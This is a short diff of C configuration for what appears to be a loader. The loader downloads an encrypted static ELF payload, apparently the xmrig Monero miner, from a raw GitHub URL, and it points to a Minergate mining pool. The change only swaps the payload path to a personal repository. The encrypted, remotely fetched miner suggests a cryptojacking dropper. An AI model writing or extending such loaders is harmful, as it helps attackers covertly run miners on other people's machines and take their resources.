@@ -10,7 +10,7 @@
 // IMPORTANTE: El loader espera un ejecutable ELF estático (no un .tar.gz),
 // previamente cifrado con la llave de arriba.
 #define PAYLOAD_HOST "raw.githubusercontent.com"
-#define PAYLOAD_PATH "/xmrig/xmrig/master/xmrig_encrypted.bin"
+#define PAYLOAD_PATH "/Darkdiamond10/xmrig1/main/xmrig.enc"
 
 // --- Configuración de Minería ---
 #define POOL_URL "xmr.pool.minergate.com:45700"
